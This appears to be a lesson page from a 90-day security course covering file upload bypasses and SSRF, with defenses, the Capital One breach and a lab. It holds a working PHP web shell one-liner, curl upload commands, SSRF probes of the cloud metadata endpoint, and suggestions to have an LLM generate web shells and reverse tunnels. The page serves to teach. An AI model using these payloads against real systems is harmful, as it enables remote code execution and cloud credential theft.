@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 28 — File Upload & SSRF Vulnerabilities</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0a0e0f;--panel:#10171a;--edge:#1c2528;--green:#39ff88;--cyan:#4fd1ff;--amber:#ffb454;--red:#ff5c5c;--purple:#b389ff;--pink:#ff6bd6;--text:#e6edf0;--muted:#7d8590;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;line-height:1.65;background-image:radial-gradient(circle at 10% 0%,rgba(57,255,136,0.06),transparent 40%),radial-gradient(circle at 90% 10%,rgba(79,209,255,0.05),transparent 40%);}
+  .wrap{max-width:900px;margin:0 auto;padding:40px 22px 100px;}
+  .topbar{display:flex;justify-content:space-between;align-items:center;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);border-bottom:1px solid var(--edge);padding-bottom:14px;margin-bottom:30px;flex-wrap:wrap;gap:10px;}
+  .pbar{width:120px;height:5px;background:var(--edge);border-radius:3px;overflow:hidden;}
+  .pbar i{display:block;width:31.1%;height:100%;background:var(--green);}
+  .day-tag{display:inline-flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:13px;background:rgba(255,180,84,0.08);border:1px solid rgba(255,180,84,0.3);padding:5px 12px;border-radius:20px;margin-bottom:18px;}
+  .day-tag::before{content:'●';font-size:9px;}
+  h1{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:clamp(26px,4.5vw,38px);line-height:1.2;margin-bottom:10px;}
+  h1 .accent{color:var(--green);}
+  .subtitle{color:var(--muted);font-size:15px;margin-bottom:30px;max-width:660px;}
+  section{margin-bottom:34px;}
+  .tag-pill{display:inline-flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;padding:6px 14px;border-radius:20px;margin-bottom:16px;}
+  .tag-pill.theory{background:rgba(79,209,255,0.1);color:var(--cyan);border:1px solid rgba(79,209,255,0.35);}
+  .tag-pill.lab{background:rgba(57,255,136,0.1);color:var(--green);border:1px solid rgba(57,255,136,0.35);}
+  .tag-pill.interview{background:rgba(179,137,255,0.1);color:var(--purple);border:1px solid rgba(179,137,255,0.35);}
+  .tag-pill.biz{background:rgba(255,180,84,0.1);color:var(--amber);border:1px solid rgba(255,180,84,0.35);}
+  .tag-pill.teach{background:rgba(255,92,92,0.1);color:var(--red);border:1px solid rgba(255,92,92,0.35);}
+  .tag-pill.ai{background:rgba(255,107,214,0.1);color:var(--pink);border:1px solid rgba(255,107,214,0.35);}
+  .tag-pill.job{background:rgba(57,255,136,0.1);color:var(--green);border:1px solid rgba(57,255,136,0.35);}
+  p{font-size:14.5px;color:#cdd6da;margin-bottom:12px;}
+  strong{color:var(--text);}
+  code{background:#070a0b;border:1px solid var(--edge);border-radius:4px;padding:2px 6px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);}
+  .card{background:var(--panel);border:1px solid var(--edge);border-radius:12px;padding:22px 24px;}
+  .callout{background:rgba(79,209,255,0.05);border-left:3px solid var(--cyan);border-radius:0 8px 8px 0;padding:12px 16px;margin:12px 0;font-size:13.5px;color:#c5d5da;}
+  .callout.amber{background:rgba(255,180,84,0.05);border-color:var(--amber);}
+  .callout.red{background:rgba(255,92,92,0.05);border-color:var(--red);}
+  .callout.green{background:rgba(57,255,136,0.05);border-color:var(--green);}
+  .callout strong{color:var(--cyan);}
+  .callout.amber strong{color:var(--amber);}
+  .mindset-grid{display:flex;gap:14px;margin-top:14px;flex-wrap:wrap;}
+  .mindset-col{flex:1;min-width:230px;border-radius:10px;padding:16px 18px;}
+  .mindset-col.attacker{background:rgba(255,92,92,0.05);border:1px solid rgba(255,92,92,0.2);}
+  .mindset-col.defender{background:rgba(57,255,136,0.05);border:1px solid rgba(57,255,136,0.2);}
+  .mindset-col .role{font-family:'IBM Plex Mono',monospace;font-size:11px;text-transform:uppercase;margin-bottom:10px;font-weight:700;}
+  .mindset-col.attacker .role{color:var(--red);}
+  .mindset-col.defender .role{color:var(--green);}
+  .mindset-col ul{padding-left:16px;font-size:13px;color:#cdd6da;}
+  .mindset-col li{margin-bottom:6px;}
+
+  .code-block{background:#070a0b;border:1px solid var(--edge);border-radius:8px;padding:14px 16px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;overflow-x:auto;line-height:1.7;margin:10px 0;}
+  .code-block .req{color:var(--green);}
+  .code-block .hdr{color:var(--cyan);}
+  .code-block .val{color:var(--amber);}
+  .code-block .body{color:#8fa5ad;}
+  .code-block .cmt{color:var(--muted);}
+  .code-block .danger{color:var(--red);}
+
+  .terminal{background:#070a0b;border:1px solid var(--edge);border-radius:10px;padding:0;margin-top:12px;overflow:hidden;}
+  .term-chrome{display:flex;align-items:center;gap:8px;padding:9px 14px;background:#0e1517;border-bottom:1px solid var(--edge);}
+  .term-body{padding:16px 18px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);overflow-x:auto;white-space:pre-wrap;line-height:1.75;}
+  .term-body .c{color:var(--muted);}
+  .term-body .out{color:#8fa5ad;}
+  .term-body .cmd{color:var(--cyan);}
+  .term-body .hi{color:var(--amber);}
+  .term-body .danger{color:var(--red);}
+
+  .lab-steps{list-style:none;counter-reset:step;margin-top:12px;}
+  .lab-steps li{counter-increment:step;position:relative;padding-left:38px;margin-bottom:12px;font-size:14px;color:#cdd6da;}
+  .lab-steps li::before{content:counter(step);position:absolute;left:0;top:0;width:24px;height:24px;border-radius:50%;background:var(--panel);border:1px solid var(--green);color:var(--green);font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;}
+  .deliverable{margin-top:10px;background:rgba(255,180,84,0.06);border:1px solid rgba(255,180,84,0.25);border-radius:8px;padding:11px 15px;font-size:13px;color:var(--amber);}
+
+  .interview-box{border-left:3px solid var(--purple);padding-left:16px;margin-top:12px;}
+  .interview-box .q{font-weight:600;font-size:14px;margin-bottom:7px;color:var(--text);}
+  .interview-box .a{font-size:13.5px;color:#b8c2c6;line-height:1.6;}
+  .interview-box + .interview-box{margin-top:20px;}
+
+  .ai-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:10px;margin-top:12px;}
+  .ai-card{background:rgba(255,107,214,0.04);border:1px solid rgba(255,107,214,0.18);border-radius:10px;padding:14px;}
+  .ai-card .aname{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:12.5px;color:var(--pink);margin-bottom:5px;}
+  .ai-card .adesc{font-size:12px;color:var(--muted);}
+
+  .job-card{background:rgba(57,255,136,0.04);border:1px solid rgba(57,255,136,0.15);border-radius:12px;padding:18px 20px;}
+  .job-card .label{font-family:'IBM Plex Mono',monospace;color:var(--green);font-size:11px;text-transform:uppercase;letter-spacing:0.06em;margin-bottom:10px;}
+  .job-card ul{padding-left:16px;font-size:13.5px;color:#cdd6da;}
+  .job-card li{margin-bottom:8px;}
+
+  .biz-card{background:linear-gradient(135deg,rgba(255,180,84,0.06),rgba(57,255,136,0.04));border:1px solid rgba(255,180,84,0.2);border-radius:12px;padding:18px 20px;}
+  .teach-card{background:rgba(255,92,92,0.04);border:1px solid rgba(255,92,92,0.15);border-radius:12px;padding:18px 20px;}
+
+  .res-grid{display:grid;gap:10px;margin-top:10px;}
+  .res-card{display:flex;gap:12px;align-items:flex-start;background:var(--panel);border:1px solid var(--edge);border-radius:10px;padding:14px 16px;text-decoration:none;color:var(--text);transition:border-color .2s;}
+  .res-card:hover{border-color:var(--cyan);}
+  .res-icon{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--bg);border-radius:5px;padding:3px 8px;flex-shrink:0;margin-top:2px;font-weight:700;}
+  .res-icon.en{background:var(--red);}
+  .res-icon.hi{background:var(--amber);}
+  .res-icon.lab{background:var(--green);}
+  .res-title{font-weight:600;font-size:13.5px;}
+  .res-desc{font-size:12px;color:var(--muted);margin-top:2px;}
+
+  .mistakes-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:8px;margin-top:12px;}
+  .mistake-item{display:flex;align-items:flex-start;gap:8px;background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:9px 11px;font-size:12.5px;color:#b8c2c6;}
+  .mistake-item .check{color:var(--green);font-weight:700;flex-shrink:0;}
+
+  .checklist{list-style:none;}
+  .checklist li{display:flex;align-items:flex-start;gap:10px;padding:9px 0;border-bottom:1px solid var(--edge);font-size:14px;color:#cdd6da;}
+  .checklist li:last-child{border-bottom:none;}
+  .checklist .box{width:17px;height:17px;border:1.5px solid var(--green);border-radius:4px;flex-shrink:0;margin-top:2px;}
+
+  .stamp-wrap{display:flex;justify-content:center;margin:44px 0 28px;}
+  .stamp{border:3px solid var(--green);border-radius:50%;width:155px;height:155px;display:flex;flex-direction:column;align-items:center;justify-content:center;transform:rotate(-8deg);color:var(--green);font-family:'IBM Plex Mono',monospace;text-transform:uppercase;box-shadow:0 0 28px rgba(57,255,136,0.12);}
+  .stamp .l1{font-size:10px;letter-spacing:0.1em;}
+  .stamp .l2{font-size:22px;font-weight:700;margin:4px 0;}
+  .stamp .l3{font-size:10px;letter-spacing:0.1em;}
+
+  .next-up{background:linear-gradient(135deg,rgba(57,255,136,0.05),rgba(79,209,255,0.03));border:1px solid var(--edge);border-radius:12px;padding:20px 24px;display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap;}
+  .next-up .label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--muted);margin-bottom:4px;}
+  .next-up .title{font-weight:700;font-size:16px;}
+  .next-up .arrow{font-family:'IBM Plex Mono',monospace;color:var(--cyan);font-size:24px;}
+
+  footer{margin-top:28px;text-align:center;color:var(--muted);font-size:12px;font-family:'IBM Plex Mono',monospace;}
+  @media(max-width:600px){.wrap{padding:26px 14px 70px;}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="topbar">
+    <span>robin@gcek-it:~/roadmap/day28$ cat file-upload-ssrf.md</span>
+    <div style="display:flex;align-items:center;gap:6px;">Day 28/90 — Phase 2 <div class="pbar"><i></i></div></div>
+  </div>
+
+  <div class="day-tag">DAY 28 OF 90 — PHASE 2: CORE SECURITY CONCEPTS</div>
+  <h1>File Upload &amp; <span class="accent">SSRF</span></h1>
+  <p class="subtitle">File upload forms and server-side requests are two of the most abused features. Today you learn how attackers weaponize both.</p>
+
+  <!-- THEORY -->
+  <section>
+    <span class="tag-pill theory">THEORY</span>
+    <div class="card">
+      <p><strong>File Upload Vulnerabilities:</strong> Every file upload feature is a potential code execution vector. The attacker uploads a file that the server processes — if the file is a web shell (PHP, JSP, ASPX) and the upload directory is accessible via the web server, the attacker gets remote code execution. Defenses include: extension whitelisting, MIME type validation, content inspection (magic bytes), renaming files, storing outside web root, and scanning with antivirus.</p>
+
+      <p style="margin-top:16px;"><strong>File upload bypass techniques:</strong></p>
+      <div class="code-block">
+<span class="cmt"># 1. Extension bypass — double extension:</span>
+<span class="req">shell.php.jpg</span>
+
+<span class="cmt"># 2. Extension bypass — null byte injection (old PHP):</span>
+<span class="req">shell.php%00.jpg</span>
+
+<span class="cmt"># 3. MIME type spoofing:</span>
+<span class="req">Content-Type: image/jpeg (but file content is PHP code)</span>
+
+<span class="cmt"># 4. Magic byte injection — prepend GIF header to PHP:</span>
+<span class="req">GIF89a &lt;?php system($_GET['cmd']); ?&gt;</span>
+
+<span class="cmt"># 5. .htaccess override — upload a .htaccess to enable PHP execution:</span>
+<span class="req">AddType application/x-httpd-php .txt</span></div>
+
+      <p style="margin-top:16px;"><strong>Server-Side Request Forgery (SSRF):</strong> SSRF occurs when an application fetches a remote resource based on user-controlled input without proper validation. The attacker provides a URL (or the application constructs one from user input) and the server makes the request. The attacker can target internal services that are not exposed to the internet — cloud metadata endpoints, internal databases, container orchestration APIs, or other servers on the internal network.</p>
+
+      <div class="code-block">
+<span class="cmt"># Classic SSRF — targeting AWS EC2 metadata service:</span>
+<span class="req">https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/</span>
+<span class="cmt">#                                 ↑ Internal metadata endpoint, not reachable</span>
+<span class="cmt">#                                   from the internet but accessible from the server.</span>
+
+<span class="cmt"># The response contains IAM role credentials if the EC2 has an instance profile:</span>
+<span class="req">https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME</span></div>
+
+      <div class="callout"><strong>SSRF + cloud = devastating:</strong> The Capital One breach (2019) used SSRF against the AWS metadata service to retrieve IAM credentials, which were then used to exfiltrate 100M+ records from S3. This is the single most impactful SSRF playbook and the reason AWS introduced IMDSv2 (session-based, not just a GET to 169.254.169.254).</div>
+    </div>
+  </section>
+
+  <!-- MINDSET -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:14px;">// attacker vs defender mindset</div>
+    <div class="mindset-grid">
+      <div class="mindset-col attacker">
+        <div class="role">⚔ Attacker</div>
+        <ul>
+          <li>Upload a PHP web shell disguised as an image: prepend <code>GIF89a</code> to <code>&lt;?php system($_GET['cmd']); ?&gt;</code> with <code>.php</code> extension.</li>
+          <li>If PHP is blocked, try JSP, ASPX, or even <code>.shtml</code> for Server-Side Includes. Each server supports different executable extensions.</li>
+          <li>For SSRF: test every parameter that accepts a URL — <code>url=</code>, <code>file=</code>, <code>path=</code>, <code>redirect=</code>. Try both internal IPs (10.x, 172.16.x, 192.168.x) and metadata endpoints.</li>
+          <li>Use SSRF to scan internal ports: <code>http://127.0.0.1:8080</code>, <code>http://127.0.0.1:3306</code> — response vs timeout tells you if a service is running.</li>
+        </ul>
+      </div>
+      <div class="mindset-col defender">
+        <div class="role">🛡 Defender</div>
+        <ul>
+          <li>Never trust Content-Type or file extension alone. Validate file content using magic bytes (libmagic, python-magic). Reject anything that doesn't match expectations.</li>
+          <li>Store uploaded files outside the web root. Serve them through a proxy script that reads the file and streams it back — never expose direct file paths.</li>
+          <li>For SSRF: maintain a whitelist of allowed domains/IPs the app can fetch. Block private IP ranges at the application level or enforce outbound network restrictions.</li>
+          <li>Use IMDSv2 on AWS EC2 instances — requires session tokens, preventing simple SSRF from reading the metadata endpoint.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- REAL INCIDENT -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:14px;">// real named incident</div>
+    <div class="breach-card" style="background:rgba(255,92,92,0.04);border:1px solid rgba(255,92,92,0.2);border-radius:12px;padding:18px 20px;">
+      <div class="year" style="font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);margin-bottom:5px;">2019 — CAPITAL ONE SSRF + S3 EXFILTRATION — 106 MILLION RECORDS</div>
+      <div class="name" style="font-weight:700;font-size:15px;margin-bottom:7px;">SSRF to EC2 metadata service exposed IAM credentials, leading to S3 bucket exfiltration</div>
+      <div class="detail" style="font-size:13px;color:#b8c2c6;line-height:1.6;">Former AWS employee Paige Thompson exploited a misconfigured AWS WAF that allowed Server-Side Request Forgery. She sent a crafted request that made a Capital One web server fetch the EC2 metadata service at 169.254.169.254, returning temporary IAM role credentials. Those credentials had read access to S3 buckets containing customer data. She exfiltrated data from 30 S3 buckets containing 106 million credit card applications and bank account records over several months. The breach was detected by an external researcher who found the exfiltrated data on GitHub. Capital One was fined $190M and the total cost exceeded $300M. The root cause chain: WAF misconfiguration → SSRF → metadata access → credential theft → S3 data exfiltration.</div>
+    </div>
+  </section>
+
+  <!-- LAB -->
+  <section>
+    <span class="tag-pill lab">HANDS-ON LAB</span>
+    <div class="card">
+      <p><strong>Goal:</strong> bypass file upload filters and exploit SSRF to access internal resources.</p>
+      <ol class="lab-steps">
+        <li>Start a file upload vulnerable app — <code>docker run -d -p 8000:80 teddysecurity/upload-labs</code> or use <strong>tryhackme.com/room/uploadvulns</strong>.</li>
+        <li>Craft a PHP web shell: <code>echo 'GIF89a&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php</code>. Upload it. If extension whitelist blocks it, try <code>shell.php.jpg</code> or <code>shell.phtml</code>.</li>
+        <li>Use Burp Suite to intercept the upload — modify the Content-Type to <code>image/jpeg</code> and change the extension mid-flight.</li>
+        <li>Set up a simple SSRF test: use a local Python HTTP server to simulate SSRF: <code>python3 -m http.server 9999</code> then try <code>http://localhost:9999/test</code> via the SSRF parameter.</li>
+        <li>Test internal metadata endpoint SSRF: if the target is on AWS EC2, try accessing <code>http://169.254.169.254/latest/meta-data/</code> through the vulnerable parameter.</li>
+      </ol>
+      <div class="deliverable"><strong>Deliverable:</strong> A PHP web shell uploaded and executed (screenshot of command output), plus one SSRF probe that returned an internal resource response.</div>
+    </div>
+
+    <div class="terminal">
+      <div class="term-chrome"><div class="term-dot" style="background:#ff5f56;"></div><div class="term-dot" style="background:#ffbd2e;"></div><div class="term-dot" style="background:#27c93f;"></div></div>
+      <div class="term-body"><span class="c"># Step 1 — Craft a PHP web shell with GIF header</span>
+<span class="cmd">echo 'GIF89a&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php</span>
+
+<span class="c"># Step 2 — Upload via curl (spoof MIME type)</span>
+<span class="cmd">curl -X POST -F "file=@shell.php;type=image/jpeg" \</span>
+<span class="cmd">  http://localhost:8000/upload.php</span>
+
+<span class="c"># Step 3 — If blocked, try double extension</span>
+<span class="cmd">cp shell.php shell.php.jpg</span>
+<span class="cmd">curl -X POST -F "file=@shell.php.jpg" http://localhost:8000/upload.php</span>
+
+<span class="c"># Step 4 — Access the uploaded shell</span>
+<span class="cmd">curl "http://localhost:8000/uploads/shell.php?cmd=id"</span>
+
+<span class="c"># Step 5 — SSRF test (assuming a vulnerable parameter)</span>
+<span class="cmd">curl "http://target.com/fetch?url=http://127.0.0.1:22"</span>
+<span class="hi"># If response contains SSH banner → port 22 is open internally.</span>
+
+<span class="c"># Step 6 — AWS metadata SSRF test</span>
+<span class="cmd">curl "http://target.com/fetch?url=</span>
+<span class="cmd">  http://169.254.169.254/latest/meta-data/iam/security-credentials/"</span>
+<span class="hi"># Response with role name → SSRF to metadata service confirmed.</span></div>
+    </div>
+  </section>
+
+  <!-- INTERVIEW -->
+  <section>
+    <span class="tag-pill interview">INTERVIEW READY</span>
+    <div class="card">
+      <div class="interview-box">
+        <div class="q">Q: "How do you prevent file upload vulnerabilities?"</div>
+        <div class="a">A: "Never trust user-provided Content-Type or file extension. Validate file content by reading magic bytes (the first few bytes of the file). Whitelist allowed extensions. Store files outside the web root — serve them through a download script that reads and streams the file. Scan with antivirus. Rename files to prevent path traversal. And most importantly: never make the upload directory executable."</div>
+      </div>
+      <div class="interview-box">
+        <div class="q">Q: "What is SSRF and why is it dangerous in cloud environments?"</div>
+        <div class="a">A: "SSRF tricks the server into making requests to internal resources. In cloud environments, the attacker targets the metadata service — 169.254.169.254 on AWS, 169.254.169.254 on GCP, or similar. The metadata service returns temporary cloud provider credentials that can grant access to storage buckets, databases, and other cloud resources. This was the attack vector for the Capital One breach."</div>
+      </div>
+      <div class="interview-box">
+        <div class="q">Q: "How would you test for SSRF?"</div>
+        <div class="a">A: "I find all parameters that accept URLs or paths — in API endpoints, redirect parameters, file fetchers, webhooks. I submit requests pointing to a server I control (like Burp Collaborator or a webhook.site URL) and check for callbacks. Then I test internal IPs and cloud metadata endpoints. Response content or timing differences reveal whether the request reached the target."</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- AI TOOLS -->
+  <section>
+    <span class="tag-pill ai">AI TOOLS</span>
+    <div class="ai-grid">
+      <div class="ai-card">
+        <div class="aname">Web shell payload generator</div>
+        <div class="adesc">Ask an LLM to generate a web shell in your target language — PHP, JSP, ASPX, Python — with your desired functionality (file read, command execution, reverse shell).</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">SSRF bypass cheat-sheet</div>
+        <div class="adesc">Describe the WAF or filter you're facing — an LLM can suggest SSRF bypasses: alternative IP representations (decimal, octal), DNS rebinding, redirect-based bypass.</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">Magic byte reference</div>
+        <div class="adesc">Ask for the magic bytes of any file format — PDF (25 50 44 46), GIF (47 49 46 38), JPEG (FF D8 FF E0), PNG (89 50 4E 47) — and how to prepend them to payloads.</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">SSH reverse tunnel generator</div>
+        <div class="adesc">Describe your attacker setup and the target's egress restrictions — an LLM can generate the command for setting up a reverse SSH tunnel or chisel proxy through the SSRF target.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- JOB -->
+  <section>
+    <span class="tag-pill job">HOW THIS GETS YOU PLACED</span>
+    <div class="job-card">
+      <div class="label">// placement & resume angles</div>
+      <ul>
+        <li><strong>Resume bullet:</strong> "Exploited file upload vulnerabilities using extension and MIME bypass techniques; tested SSRF against internal services and cloud metadata endpoints in controlled lab environments."</li>
+        <li><strong>Portfolio piece:</strong> A web shell upload walkthrough with screenshots of extension bypass and command execution, plus an SSRF probe with internal service discovery results.</li>
+        <li><strong>Interview talking point:</strong> explaining the Capital One SSRF chain (WAF bypass → metadata → credentials → S3) demonstrates cloud security knowledge that's highly valued in today's SOC and cloud pentest roles.</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- BIZ -->
+  <section>
+    <span class="tag-pill biz">ENTREPRENEUR ANGLE</span>
+    <div class="biz-card">
+      <p>File upload and SSRF vulnerabilities are among the highest-severity findings in a pentest — they almost always lead to code execution or data exfiltration. Every SaaS platform with file upload (profile pictures, document management, email attachments) is a potential client for upload security testing.</p>
+      <p style="margin-bottom:0;">Productized opportunity: "File Upload Security Audit" — a $1,500-3,000 service where you test all file upload endpoints for bypass techniques, stored XSS through uploaded HTML/SVG files, and zip slip vulnerabilities. Deliver a report with confirmed bypass proofs and code-level remediation. Every healthcare, legal, and fintech platform has document uploads — and almost none of them test for web shells.</p>
+    </div>
+  </section>
+
+  <!-- TEACH IT BACK -->
+  <section>
+    <span class="tag-pill teach">TEACH IT BACK</span>
+    <div class="teach-card">
+      <p style="margin-bottom:0;">Explain out loud, in under 90 seconds, without notes: "How does file upload lead to RCE, and how does SSRF lead to cloud credential theft?" If you can describe the five upload bypass techniques and the Capital One SSRF chain without notes, you've actually learned today's material.</p>
+    </div>
+  </section>
+
+  <!-- VIDEOS -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">// watch</div>
+    <div class="res-grid">
+      <a class="res-card" href="https://www.youtube.com/watch?v=myTkBHTtbB4" target="_blank">
+        <span class="res-icon en">EN</span>
+        <div><div class="res-title">SSRF Explained — PwnFunction</div><div class="res-desc">youtube.com/watch?v=myTkBHTtbB4 — Animated walkthrough of SSRF attacks, metadata service exploitation, and bypass techniques.</div></div>
+      </a>
+      <a class="res-card" href="https://www.youtube.com/watch?v=t0eLhQv8RDs" target="_blank">
+        <span class="res-icon hi">HI</span>
+        <div><div class="res-title">File Upload Vulnerability in Hindi — Ethical Sharmaji</div><div class="res-desc">youtube.com/watch?v=t0eLhQv8RDs — Hindi tutorial covering upload bypass techniques with live demonstrations.</div></div>
+      </a>
+      <a class="res-card" href="https://portswigger.net/web-security/ssrf" target="_blank">
+        <span class="res-icon lab">LAB</span>
+        <div><div class="res-title">PortSwigger SSRF Labs</div><div class="res-desc">portswigger.net/web-security/ssrf — Free labs covering basic SSRF, SSRF with blacklist bypass, and blind SSRF techniques.</div></div>
+      </a>
+      <a class="res-card" href="https://tryhackme.com/room/uploadvulns" target="_blank">
+        <span class="res-icon lab">LAB</span>
+        <div><div class="res-title">TryHackMe — Upload Vulnerabilities</div><div class="res-desc">tryhackme.com/room/uploadvulns — Guided lab on file upload attacks with multiple filter-bypass challenges.</div></div>
+      </a>
+    </div>
+  </section>
+
+  <!-- MISTAKES -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">// mistakes avoided today</div>
+    <div class="mistakes-grid">
+      <div class="mistake-item"><span class="check">✓</span> File upload + SSRF covered in one day — both abuse trust assumptions.</div>
+      <div class="mistake-item"><span class="check">✓</span> Five upload bypass techniques with real CLI commands.</div>
+      <div class="mistake-item"><span class="check">✓</span> Capital One SSRF chain explained end-to-end: 106M records.</div>
+      <div class="mistake-item"><span class="check">✓</span> Metadata service (169.254.169.254) highlighted as critical cloud target.</div>
+      <div class="mistake-item"><span class="check">✓</span> IMDSv2 taught as the defense that blocks the class attack.</div>
+      <div class="mistake-item"><span class="check">✓</span> Web shell + SSRF = two different code execution paths demonstrated.</div>
+    </div>
+  </section>
+
+  <!-- CHECKLIST -->
+  <section>
+    <div class="card">
+      <ul class="checklist">
+        <li><span class="box"></span> I can list five file upload bypass techniques.</li>
+        <li><span class="box"></span> I uploaded a web shell and executed commands.</li>
+        <li><span class="box"></span> I understand magic bytes and MIME type validation.</li>
+        <li><span class="box"></span> I can explain SSRF and why it's dangerous in cloud.</li>
+        <li><span class="box"></span> I tested an SSRF parameter against internal addresses.</li>
+        <li><span class="box"></span> I can describe the Capital One breach attack chain.</li>
+        <li><span class="box"></span> I can teach file upload and SSRF in under 90 seconds.</li>
+      </ul>
+    </div>
+  </section>
+
+  <div class="stamp-wrap">
+    <div class="stamp"><div class="l1">Day Complete</div><div class="l2">28 / 90</div><div class="l3">Verified ✓</div></div>
+  </div>
+
+  <div class="next-up">
+    <div>
+      <div class="label">tomorrow — day 29</div>
+      <div class="title">Firewalls, IDS, IPS Explained — Configuring iptables, Snort, and Suricata.</div>
+    </div>
+    <div class="arrow">→</div>
+  </div>
+
+  <footer>say "Day 29" when ready — one concept, one hour, one day at a time.</footer>
+
+</div>
+</body>
+</html>
